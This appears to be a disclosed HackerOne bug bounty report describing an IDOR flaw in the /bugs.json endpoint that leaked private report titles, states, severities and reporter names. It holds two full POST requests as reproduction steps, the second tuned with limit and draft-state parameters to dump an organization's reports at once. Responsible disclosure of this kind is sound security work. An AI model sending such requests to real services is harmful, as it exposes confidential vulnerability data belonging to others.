[bate5a](https://hackerone.com/bate5a)

 submitted a report to [**HackerOne**](https://hackerone.com/security).

May 2, 2024, 9:18pm UTC

### Hi H1 i hope you are Doing Well Today :)

### Explaining

- I Found that any private reports can be accessed by sending a POST request to the `/bugs.json` endpoint. This vulnerable endpoint requires `organization_id`, which takes the organization's ID as a value. It also requires `text_query`, which is used to search for report IDs. within this org , Now you can append the example organization ID mentioned on the policy page, `58579`. and For the `text_query`, you can simply append a single digit, such as 1, or any other single number. This will query all reports containing this digit, provided they belong to the specified organization

### Step To Reproduce

1.Send a POST request to this endpoint. You can change the organization_id to anything, but leave it as it is

**Code**•636 Bytes

POST /bugs.json HTTP/2 Host: hackerone.com Cookie: __Host-session=Your-Session-Here X-Csrf-Token: Your-Csrf-Here Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Te: trailers Content-Length: 390 text_query=1&organization_id=58579&persist=true&sort_type=pg_search_rank&view=message&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=retesting&substates%5B%5D=pending-program-review&substates%5B%5D=spam&duplicates_must_have_no_ref=true

### Poc Video

█████████

## Impact

idor lead to view private reports `title`,`url`,`id`,`state`,`substate`,`severity_rating`,`readable_substate`,`created_at`,`submitted_at`,`reporter_name`

Show older activities

[

](https://hackerone.com/bate5a)

[bate5a](https://hackerone.com/bate5a)

 posted a comment. 

Updated [May 8, 2024, 4:32am UTC](https://hackerone.com/reports/2487889#activity-27364271)

Hi again [@h1_analyst_oscar](https://hackerone.com/h1_analyst_oscar)

Quick Update:I found that we can include the parameters `limit=1000` and `page=1` in the above request. This way, we don't need to include anything in `text_query`, which would otherwise disclose all private reports at once within org `13`, which belongs to h1. Instead of putting random numbers in `text_query` each time, this will reduce the time spent guessing all the report numbers for this org. We can also include the parameter `substates%5B%5D=editing`, which will disclose the drafted reports.

**Code**•898 Bytes

POST /bugs.json HTTP/2 Host: hackerone.com Cookie: Your-Cookies User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: https://hackerone.com/bugs?subject=user X-Csrf-Token: Csrf-Token X-Requested-With: XMLHttpRequest Content-Type: application/x-www-form-urlencoded Content-Length: 457 text_query=&organization_id=13&view=open&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=pending-program-review&substates%5B%5D=triaged&substates%5B%5D=pre-submission&substates%5B%5D=retesting&substates%5B%5D=not-applicable&substates%5B%5D=editing&substates%5B%5D=informative&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=1000&page=1

Note:this bug can be exploited in private organizations as well, not just public ones, which would disclose program handler, about, etc...